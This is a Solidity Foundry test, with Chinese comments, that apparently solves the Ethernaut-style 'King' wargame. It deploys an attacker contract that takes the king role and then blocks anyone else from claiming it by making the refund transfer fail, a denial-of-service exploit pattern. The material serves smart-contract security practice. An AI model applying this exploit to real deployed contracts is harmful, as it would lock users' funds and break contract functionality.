pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {King, KingAttacker} from "../src/King.sol";


/** 
 * 解题思路：通过让 receiver 中的转账失败，让所有人无法向 King 合约转账，那么 King 就永远无法失败：
 * 这里是构造了一个攻击合约来实现，其实如果测试合约本身不设置接受转账的方法，那么攻击就已经完成
 */
contract HackKingTest is Test {
    address hacker = address(hacker);
    King public k;
    KingAttacker public ka;

    function setUp() public {
        vm.deal(hacker, 10 ether);
        k = new King();
        ka = new KingAttacker();
        vm.deal(address(ka), 10 ether);
    }
    function testHackKing() public {
        vm.startPrank(hacker);
        address k1 = address(k);
        address payable k2 = payable(k1);
        console.log("attacker addr:");
        console.logAddress(address(ka));
        console.log("King owner:");
        console.logAddress(k.owner());
        console.log("King prize:");
        console.logUint(k.prize());


        ka.attack(k2);
        console.log("King balance:");
        console.logUint(address(k).balance);
        console.log("KingAttacker balance:");
        console.logUint(address(ka).balance);

        // 此时合约的 King 已经是 KingAttacker 的地址
        console.log("Current King:");
        (address addr) = k._king();
        console.logAddress(addr);
        vm.stopPrank();
    }

    // 这里设置一个函数用于接受 King 合约的转账，如果不设置这个合约，攻击已经完成，因为这测试合约不能接收转账，所以其他人无法给 King 合约转账
    fallback() external payable{

    }
}
